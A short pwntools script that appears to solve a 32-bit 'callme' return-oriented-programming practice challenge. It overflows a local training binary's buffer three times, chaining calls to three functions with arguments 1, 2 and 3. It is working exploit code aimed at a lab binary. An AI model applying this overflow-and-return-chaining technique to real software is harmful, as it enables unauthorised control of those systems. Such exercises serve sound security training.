from pwn import *

p = process("./callme32")
p.recvuntil("> ")
p.sendline("A"*44+p32(0x080485c0)+p32(0x0804873b)+p32(1)+p32(2)+p32(3)) #callme_one -> jump to main
p.recvuntil("> ")
p.sendline("A"*44+p32(0x08048620)+p32(0x0804873b)+p32(1)+p32(2)+p32(3))
p.recvuntil("> ")
p.sendline("A"*44+p32(0x080485b0)+p32(0x0804873b)+p32(1)+p32(2)+p32(3))
p.interactive()
